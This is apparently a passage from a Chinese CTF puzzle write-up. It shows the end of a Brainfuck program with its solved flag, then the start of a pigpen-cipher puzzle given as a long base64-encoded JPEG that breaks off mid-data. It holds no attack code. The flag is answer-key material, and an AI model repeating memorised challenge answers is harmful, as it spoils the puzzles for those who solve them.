class="hljs-title">]</span>&gt;<span class="hljs-literal">-</span> <span class="hljs-literal">-</span><span class="hljs-string">.</span>++<span class="hljs-literal">+</span> ++<span class="hljs-literal">+</span><span class="hljs-string">.</span>&lt; ++<span class="hljs-literal">+</span><span class="hljs-literal">+</span><span class="hljs-title">[</span> <span class="hljs-literal">-</span>&gt;++<span class="hljs-literal">+</span> <span class="hljs-literal">+</span>&lt;<span class="hljs-title">]</span>&gt;<span class="hljs-literal">+</span> ++<span class="hljs-literal">+</span><span class="hljs-string">.</span>&lt; ++<span class="hljs-literal">+</span><span class="hljs-literal">+</span><span class="hljs-literal">+</span> ++<span class="hljs-literal">+</span><span class="hljs-title">[</span><span class="hljs-literal">-</span> &gt;--<span class="hljs-literal">-</span><span class="hljs-literal">-</span> --<span class="hljs-literal">-</span><span class="hljs-literal">-</span>&lt; <span class="hljs-title">]</span>&gt;--<span class="hljs-literal">-</span> --<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span> --<span class="hljs-literal">-</span><span class="hljs-string">.</span>&lt; ++<span class="hljs-literal">+</span><span class="hljs-literal">+</span><span class="hljs-literal">+</span> ++<span class="hljs-title">[</span><span class="hljs-literal">-</span>&gt; ++<span class="hljs-literal">+</span><span class="hljs-literal">+</span><span class="hljs-literal">+</span> ++&lt;<span class="hljs-title">]</span>&gt; ++<span class="hljs-literal">+</span><span class="hljs-string">.</span>&lt; ++<span class="hljs-literal">+</span><span class="hljs-literal">+</span><span class="hljs-literal">+</span> <span class="hljs-literal">+</span><span class="hljs-title">[</span><span class="hljs-literal">-</span>&gt;<span class="hljs-literal">-</span> --<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span> &lt;<span class="hljs-title">]</span>&gt;-- --<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span> <span class="hljs-literal">-</span><span class="hljs-string">.</span>--<span class="hljs-string">.</span> --<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-string">.</span> --<span class="hljs-string">.</span>++ ++<span class="hljs-literal">+</span><span class="hljs-literal">+</span><span class="hljs-literal">+</span> <span class="hljs-literal">+</span><span class="hljs-string">.</span>&lt;++ ++<span class="hljs-literal">+</span><span class="hljs-literal">+</span><span class="hljs-title">[</span> <span class="hljs-literal">-</span>&gt;++<span class="hljs-literal">+</span> ++<span class="hljs-literal">+</span>&lt;<span class="hljs-title">]</span> &gt;++<span class="hljs-literal">+</span><span class="hljs-literal">+</span> <span class="hljs-literal">+</span><span class="hljs-string">.</span>++<span class="hljs-string">.</span> &lt;++<span class="hljs-literal">+</span><span class="hljs-literal">+</span> ++<span class="hljs-title">[</span><span class="hljs-literal">-</span>&gt; --<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span> <span class="hljs-literal">-</span>&lt;<span class="hljs-title">]</span>&gt;<span class="hljs-literal">-</span> --<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span> --<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-string">.</span> <span class="hljs-literal">-</span><span class="hljs-string">.</span>&lt;++ ++<span class="hljs-literal">+</span><span class="hljs-literal">+</span><span class="hljs-literal">+</span> <span class="hljs-title">[</span><span class="hljs-literal">-</span>&gt;++ ++<span class="hljs-literal">+</span><span class="hljs-literal">+</span><span class="hljs-literal">+</span> &lt;<span class="hljs-title">]</span>&gt;<span class="hljs-literal">+</span><span class="hljs-string">.</span> --<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-string">.</span> ++<span class="hljs-literal">+</span><span class="hljs-literal">+</span><span class="hljs-string">.</span> &lt;++<span class="hljs-literal">+</span><span class="hljs-literal">+</span> ++<span class="hljs-literal">+</span><span class="hljs-title">[</span><span class="hljs-literal">-</span> &gt;--<span class="hljs-literal">-</span><span class="hljs-literal">-</span> --<span class="hljs-literal">-</span>&lt;<span class="hljs-title">]</span> &gt;--<span class="hljs-literal">-</span><span class="hljs-literal">-</span> <span class="hljs-string">.</span><span class="hljs-literal">+</span><span class="hljs-string">.</span>&lt;<span class="hljs-literal">+</span> ++<span class="hljs-literal">+</span><span class="hljs-literal">+</span><span class="hljs-literal">+</span> ++<span class="hljs-title">[</span><span class="hljs-literal">-</span>&gt; ++<span class="hljs-literal">+</span><span class="hljs-literal">+</span><span class="hljs-literal">+</span> ++<span class="hljs-literal">+</span>&lt;<span class="hljs-title">]</span> &gt;++<span class="hljs-literal">+</span><span class="hljs-literal">+</span> ++<span class="hljs-literal">+</span><span class="hljs-literal">+</span><span class="hljs-literal">+</span> ++<span class="hljs-string">.</span>&lt;<br><br></code></pre></td></tr></table></figure><p>brainfuck</p><p>flag{0d86208ac54fbf12}</p><h1 id="把猪困在猪圈里"><a href="#把猪困在猪圈里" class="headerlink" title="把猪困在猪圈里"></a>把猪困在猪圈里</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/9j/</span><span class="hljs-number">4</span>AAQSkZJRgABAQEAYABgAAD<span class="hljs-regexp">/4RDaRXhpZgAATU0AKgAAAAgABAE7AAIAAAAFAAAISodpAAQAAAABAAAIUJydAAEAAAAKAAAQyOocAAcAAAgMAAAAPgAAAAAc6gAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFIwMFQAAAAFkAMAAgAAABQAABCekAQAAgAAABQAABCykpEAAgAAAAM0MQAAkpIAAgAAAAM0MQAA6hwABwAACAwAAAiSAAAAABzqAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMjAyMTowMToxMCAyMjo0MDo1OQAyMDIxOjAxOjEwIDIyOjQwOjU5AAAAUgAwADAAVAAAAP/</span>hCxdodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvADw<span class="hljs-regexp">/eHBhY2tldCBiZWdpbj0n77u/</span>JyBpZD0nVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkJz8+DQo8eDp4bXBtZXRhIHhtbG5zOng9ImFkb2JlOm5zOm1ldGEvIj48cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPjxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PSJ1dWlkOmZhZjViZGQ1LWJhM2QtMTFkYS1hZDMxLWQzM2Q3NTE4MmYxYiIgeG1sbnM6ZGM9Imh0dHA6Ly9wdXJsLm9yZy9kYy9lbGVtZW50cy8xLjEvIi8+PHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9InV1aWQ6ZmFmNWJkZDUtYmEzZC0xMWRhLWFkMzEtZDMzZDc1MTgyZjFiIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iPjx4bXA6Q3JlYXRlRGF0ZT4yMDIxLTAxLTEwVDIyOjQwOjU5LjQxMTwveG1wOkNyZWF0ZURhdGU+PC9yZGY6RGVzY3JpcHRpb24+PHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9InV1aWQ6ZmFmNWJkZDUtYmEzZC0xMWRhLWFkMzEtZDMzZDc1MTgyZjFiIiB4bWxuczpkYz0iaHR0cDovL3B1cmwub3JnL2RjL2VsZW1lbnRzLzEuMS8iPjxkYzpjcmVhdG9yPjxyZGY6U2VxIHhtbG5zOnJkZj0iaHR0cDovL3d3dy53My5vcmcvMTk5OS8wMi8yMi1yZGYtc3ludGF4LW5zIyI+PHJkZjpsaT5SMDBUPC9yZGY6bGk+PC9yZGY6U2VxPg0KCQkJPC9kYzpjcmVhdG9yPjwvcmRmOkRlc2NyaXB0aW9uPjwvcmRmOlJERj48L3g6eG1wbWV0YT4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgPD94cGFja2V0IGVuZD0ndyc<span class="hljs-regexp">/Pv/</span>bAEMABwUFBgUEBwYFBggHBwgKEQsKCQkKFQ8QDBEYFRoZGBUYFxseJyEbHSUdFxgiLiIlKCkrLCsaIC8zLyoyJyorKv<span class="hljs-regexp">/bAEMBBwgICgkKFAsLFCocGBwqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKv/</span>AABEIADMBcQMBIgACEQEDEQH<span class="hljs-regexp">/xAAfAAABBQEBAQEBAQAAAAAAAAAAAQIDBAUGBwgJCgv/</span>xAC1EAACAQMDAgQDBQUEBAAAAX0BAgMABBEFEiExQQYTUWEHInEUMoGRoQgjQrHBFVLR8CQzYnKCCQoWFxgZGiUmJygpKjQ1Njc4OTpDREVGR0hJSlNUVVZXWFlaY2RlZmdoaWpzdHV2d3h5eoOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4eLj5OXm5+jp6vHy8<span class="hljs-regexp">/T19vf4+fr/</span>xAAfAQADAQEBAQEBAQEBAAAAAAAAAQIDBAUGBwgJCgv<span class="hljs-regexp">/xAC1EQACAQIEBAMEBwUEBAABAncAAQIDEQQFITEGEkFRB2FxEyIygQgUQpGhscEJIzNS8BVictEKFiQ04SXxFxgZGiYnKCkqNTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqCg4SFhoeIiYqSk5SVlpeYmZqio6Slpqeoqaqys7S1tre4ubrCw8TFxsfIycrS09TV1tfY2dri4+Tl5ufo6ery8/</span>T19vf4+fr<span class="hljs-regexp">/2gAMAwEAAhEDEQA/</span>APov7Ha<span class="hljs-regexp">/8+0P/</span>fsUfY7X<span class="hljs-regexp">/n2h/</span>wC<span class="hljs-regexp">/YqaigCH7Ha/</span><span class="hljs-number">8</span>+<span class="hljs-number">0</span>P<span class="hljs-regexp">/AH7FH2O1/</span>wCfaH<span class="hljs-regexp">/v2KmooAh+x2v/</span>AD7Q<span class="hljs-regexp">/wDfsUfY7X/</span>n2h<span class="hljs-regexp">/79ipqKAIfsdr/</span>AM+<span class="hljs-number">0</span>P<span class="hljs-regexp">/fsUfY7X/</span>n2h<span class="hljs-regexp">/79ipqKAIfsdr/</span>z7Q<span class="hljs-regexp">/9+xR9jtf+faH/</span>AL9ipqKAIfsdr<span class="hljs-regexp">/z7Q/</span><span class="hljs-number">8</span>AfsUfY7X<span class="hljs-regexp">/AJ9of+/</span>YqaigCH7Ha<span class="hljs-regexp">/8APtD/</span>AN+xR9jtf+faH<span class="hljs-regexp">/v2KmooAh+x2v8Az7Q/</span><span class="hljs-number">9</span>+xR9jtf+faH<span class="hljs-regexp">/v2KmooAh+x2v/</span>PtD<span class="hljs-regexp">/37FH2O1/</span><span class="hljs-number">59</span>of8Av2KmooAh+x2v<span class="hljs-regexp">/PtD/</span>wB+xR9jtf8An2h<span class="hljs-regexp">/79ipqKAIfsdr/</span>wA+<span class="hljs-number">0</span>P8A37FH2O1<span class="hljs-regexp">/59of+/</span>YqaigCH7Ha<span class="hljs-regexp">/wDPtD/</span><span class="hljs-number">37</span>FH2O1<span class="hljs-regexp">/59of+/</span>YqaigCH7Ha<span class="hljs-regexp">/8+0P/</span>fsUfY7X<span class="hljs-regexp">/n2h/</span>wC<span class="hljs-regexp">/YqaigCH7Ha/</span><span class="hljs-number">8</span>+<span class="hljs-number">0</span>P<span class="hljs-regexp">/AH7FH2O1/</span>wCfaH<span class="hljs-regexp">/v2KmooAh+x2v/</span>AD7Q<span class="hljs-regexp">/wDfsUfY7X/</span>n2h<span class="hljs-regexp">/79ipqKAIfsdr/</span>AM+<span class="hljs-number">0</span>P<span class="hljs-regexp">/fsUfY7X/</span>n2h<span class="hljs-regexp">/79ipqKAIfsdr/</span>z7Q<span class="hljs-regexp">/9+xR9jtf+faH/</span>AL9ipqKAIfsdr<span class="hljs-regexp">/z7Q/</span><span class="hljs-number">8</span>AfsUfY7X<span class="hljs-regexp">/AJ9of+/</span>YqaigCH7Ha<span class="hljs-regexp">/8APtD/</span>AN+xR9jtf+faH<span class="hljs-regexp">/v2KmooAh+x2v8Az7Q/</span><span class="hljs-number">9</span>+xR9jtf+faH<span class="hljs-regexp">/v2KmooAh+x2v/</span>PtD<span class="hljs-regexp">/37FH2O1/</span><span class="hljs-number">59</span>of8Av2KmooAh+x2v<span class="hljs-regexp">/PtD/</span>wB+xR9jtf8An2h<span class="hljs-regexp">/79ipqKAIfsdr/</span>wA+<span class="hljs-number">0</span>P8A37FH2O1<span class="hljs-regexp">/59of+/</span>YqaigCH7Ha<span class="hljs-regexp">/wDPtD/</span><span class="hljs-number">37</span>FFTUUAFMnR5Ld0hlMMjKQsgUHafXB4NPpk0qwQPK4dljUsQiF2IHooySfYc0nsCOY8P+JbxNYbw34rWODWEUvbzRjbFfxD+NPRh<span class="hljs-regexp">/EnbqOOkfxP8Rah4W8DXGqaQ0aXUcsaKZE3DDMAeKraNpN94m8W2/i</span><span class="hljs-regexp">/XLWTTorJHi0qwkXbKFYYaWUdmI6L2HXmmfGLT73VPhvdW2m2k95cNPCRFbxNI5AcEnAGae/</span>Lfur<span class="hljs-regexp">/f/</span>luONrvt<span class="hljs-regexp">/wAAy5rX4wQ2rztq/</span>hoqiFyAkmcAZ<span class="hljs-regexp">/55103w316+8TeANP1bVWRrq48zeY12j5ZGUcfQCt69Rn0e4RVLMYGAUDknb0rlvhJY3em/</span>C<span class="hljs-regexp">/SrXUbWa0uI/</span>N3wzxlHXMrkZU8jgg019r5fqT9mLOem1v4g67478Q6V4WvtJt7bSZY1xextkh1yMFVOeh647Vu+H7P4lRa5bv4l1LQ59MG7zo7RXEh+U4xlAPvY79Ki8Gade2vxM8b3VzZ3ENvdTWxgmkiZUlARs7SRhse1d5QtEvRfkOXxNeYZorM8Q6Mdd0eSzju5rGbcskFzAcNFIpyre4z1HcZFcb<span class="hljs-regexp">/wk/</span>jmeU+HB4ceDVseW+tkE2Sr3mXjk45CZ68Hpip8g8z0XOeleVza38Qdd8d+IdK8LX2k29tpMsa4vY2yQ65GCqnPQ9cdq9E0LSE0LRYNPS4mujHuZ5523PK7MWZifUsSa5PwZp17a<span class="hljs-regexp">/EzxvdXNncQ291NbGCaSJlSUBGztJGGx7U0lzP0/</span>VA<span class="hljs-regexp">/hv5ol8P2fxKi1y3fxLqWhz6YN3nR2iuJD8pxjKAfex36V2+aKzPEOjHXdHks47uaxm3LJBcwHDRSKcq3uM9R3GRQ3oFjToznpXnX/</span>CT+OZ5T4cHhx4NWx5b62QTZKveZeOTjkJnrwemK7XQtITQtFg09Lia6Me5nnnbc8rsxZmJ9SxJo8wOS8Q2<span 